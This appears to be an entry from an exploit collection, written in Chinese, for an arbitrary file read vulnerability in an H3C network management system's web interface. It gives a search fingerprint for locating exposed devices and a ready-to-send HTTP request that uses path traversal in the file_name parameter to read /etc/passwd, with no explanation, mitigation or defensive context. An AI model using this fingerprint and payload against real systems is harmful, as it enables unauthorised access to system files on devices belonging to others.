# H3C网络管理系统file_name任意文件读取漏洞

H3C ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="webui/js/jquerylib/jquery-1.7.2.min.js"`
- **请求**：`GET /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down HTTP/1.1`